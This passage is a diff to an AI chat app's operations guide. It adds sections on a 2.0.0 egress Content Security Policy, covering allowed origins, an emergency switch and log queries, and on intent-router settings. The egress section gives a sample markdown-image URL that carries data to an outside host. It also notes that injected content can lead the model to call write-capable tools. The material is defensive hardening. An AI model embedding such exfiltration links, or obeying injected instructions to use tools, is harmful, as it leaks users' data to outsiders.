@@ -1024,6 +1024,56 @@ credential is per user or the caller's own Databricks identity) and the View run
 
 ---
 
+### 6.17 Egress CSP (2.0.0): allow an origin, emergency switch, reading the logs
+
+From 2.0.0 the browser loads images, fonts, stylesheets, media, fetches and frames only from the app itself (plus `data:` and `blob:`). Text that a model or a tool writes into an answer, a document or a deck (`![x](https://host/p.png?d=<data>)`) can no longer make the browser call an outside host with no click. Versions before 2.0.0 do not have this protection: the answer to "are we exposed" is **upgrade to 2.0.0**.
+
+**Allow an origin (a design system that really uses a remote font or image).**
+- **Admin card, no redeploy:** Settings > Administrators > *External asset origins*. Add an `https://host[:port]` origin (no wildcard, path, IP address, or Databricks host), then save. The change reaches every replica within about 15 s and applies to pages loaded after that. Each change is recorded in the admin audit trail (`egress.settings`).
+- **`app.yaml`, for infrastructure as code:** `EXTERNAL_ASSET_ORIGINS` (space- or comma-separated origins). It is a floor: the card adds to it and cannot remove it. An invalid entry is dropped, never emitted.
+- An allowed origin opens **only** `img-src`, `font-src` and `style-src`. It never opens `connect-src`, `media-src`, `frame-src`, `default-src` or `script-src`. Anything an allowed origin receives in a URL is readable by whoever runs it, so add only hosts your organization controls, never shared hosting, form or script services. A design system that needs a script library must vendor it in the zip.
+
+**Emergency switch.** `CSP_EGRESS=report` in the `env` of `app.yaml`, then redeploy **the same build** (no rebuild; the bundle's `config.env` does not reach the app). The value must be exactly `report`: any other value (`Report`, `report `, a typo) keeps enforcement and writes one warning at boot. It removes only the browser part: the egress and script directives leave the enforced header, and the Report-Only policy keeps watching. It does **not** turn off the other layers, which stay on: the placeholder for external images in the chat and documents, the deck sanitizer (on save and on read), the `web_fetch` URL rule, and the system-prompt rule. Use it for a short time, fix the cause (usually an origin to allow), and remove it.
+
+**Reading the logs** (`databricks apps logs <app> -p <PROFILE>`; every line is one JSON object, see [§2](#2-logs)):
+
+```bash
+# a browser blocked a load (enforce) or would have (report): directive and origin only, never a path or a query
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | startswith("csp report:")) | .msg | sub("^csp report: "; "") | fromjson | [.disposition, .directive, .blocked, (.document // "")] | @tsv' | sort | uniq -c | sort -rn
+
+# the server removed or refused an external reference: surface, kind and host only
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | contains("egress_blocked")) | .msg | fromjson | [.surface, .kind, (.hosts | join(","))] | @tsv' | sort | uniq -c | sort -rn
+```
+
+- `csp_violation` (`csp report: {...}`): `directive` (`img-src`, `font-src`, `style-src`, `script-src`...), `blocked` (the origin, or `inline`, `eval`, `data`, `blob`; clipped to 120 characters, so a very long origin can be cut, without a marker), optional `document` (`about:srcdoc` for a frame), `disposition` (`enforce` or `report`). A rate limit per user (`CSP_REPORT_PER_MIN`, default 60) applies. A recurring `blocked` origin from a design system is the signal to allow it; a host you do not recognize that shows up right after a model turn is the attempt this release stops.
+- `egress_blocked`: `surface` (`answer`, `deck`, `document`, `web_fetch`), `kind` (`image`, `link`, `css`, `handler`, `url`), `hosts` (hostnames only), `count`, `route`, and `truncated` when a size cap was hit. A rate limit per user (`EGRESS_LOG_PER_MIN`, default 60; `0` = unlimited) applies. `request_id` and `user_hash` come from the request, so a line can be tied to the turn without carrying the content.
+
+**Tool arguments (what the browser rule cannot cover).** The CSP protects the browser. A tool runs on the server and can send what the model gives it:
+- Keep the serverless **network policy** of the workspace restrictive, so the Python tool (UC function) has no outbound network. The app cannot check this for you.
+- Review which **external MCP tools** can write or publish (post a message, create a ticket, send an email, upload a file), and disable the ones that are not needed (the MCP connections and the tool policy in Settings). Content the model read can ask it to call them.
+- **Web search** sends the query to the provider the admin chose ([web-search.md](web-search.md)). `web_fetch` only opens a URL that a user typed or that a `web_search`/`web_fetch` result listed; other tool results (Genie, MCP, files) do not count.
+
+**Known residual.** Inline script in a sandboxed frame (design-system cards, slides) can still open a WebRTC connection (a STUN packet reached a loopback listener in a Chromium probe). Navigating the frame to an outside host is blocked by `frame-src`. Closing WebRTC needs those frames on their own origin and policy (planned for 2.x).
+
+### 6.18 Intent router (2.0.0): `INTENT_ROUTER` and the OpenJev endpoint
+
+The turn decides what it is about (deck, document, spreadsheet, image, company data) with a Haiku classifier on turns the regexes cannot read ([web-search.md](web-search.md) and the tool policy are not affected). The router can also ask OpenJev (Qwen3.5 4B on System One), a small decision model that answers yes/no questions in one batched request (about 0.3 s, about US$ 0.04 per 1,000 turns).
+
+| Variable | Values | Effect |
+|---|---|---|
+| `INTENT_ROUTER` | `race` (default), `shadow`, `haiku` | `race`: both start together; when OpenJev is confident its rules decide and the Haiku request is aborted, otherwise Haiku decides; if both fail the regexes decide. `shadow`: Haiku still decides; OpenJev runs in parallel, is never awaited, and only writes the `intent_router` telemetry event. `haiku`: the Haiku classifier alone, as before (the revert). Any other value is `haiku`. |
+| `INTENT_OPENJEV_ENDPOINT` | default `system.ai.openjev-qwen35-4b` | The System One model used by `shadow` and `race`. An empty value turns OpenJev off. If the workspace does not have the endpoint (HTTP 404), the router logs one `intent router: OpenJev endpoint not found` line, uses Haiku, and tries again after 10 minutes. |
+
+`race` is the default, so a fresh install works with no setting (offline re-score on 40 held-out items: race 40/40, equal to Haiku, deck recall on multi-route requests 7/7). To revert, set `INTENT_ROUTER=haiku` in the `env` of `app.yaml` (the commented line is there) and redeploy the same build; there is no migration, and that is the whole rollback.
+
+- **Failures are logged:** an OpenJev HTTP error, timeout, network error or unreadable reply writes one `intent router: OpenJev <kind>; the Haiku classifier decides this turn` warning per kind every 10 minutes (never the message), and the turn goes on with Haiku.
+- **What it never does:** remove an enabled tool or web search. The OpenJev verdict on tools and web is a hint written to telemetry, nothing else.
+- **Ledger:** each OpenJev call is one `intent_openjev` row (input US$ 0.042 per 1M tokens, output 0). The model is not a chat model and never appears in the picker. The call does not carry `usage_context`, so it is not in the cost dashboard's per-app scope.
+- **Telemetry:** one `intent_router` span per classified turn with `mode`, `gate`, `regex`, `haiku`, `openjev_probs`, `resolved`, `confident`, `chosen_source` (`openjev`, `haiku` or `regex`), `ms_openjev`, `ms_haiku`, `haiku_empty`. It carries probabilities and decisions only, never the message text.
+- **Before `race` is the default:** compare `resolved` with `haiku` in shadow (agreement on the artifact policies, share of `confident` turns, p95 of `ms_openjev`).
+
+---
+
 ## 7. Scale and known limits
 
 - **Service principal pool:** a shared pool with `max: 8` connections (`POOL_OPTS` and
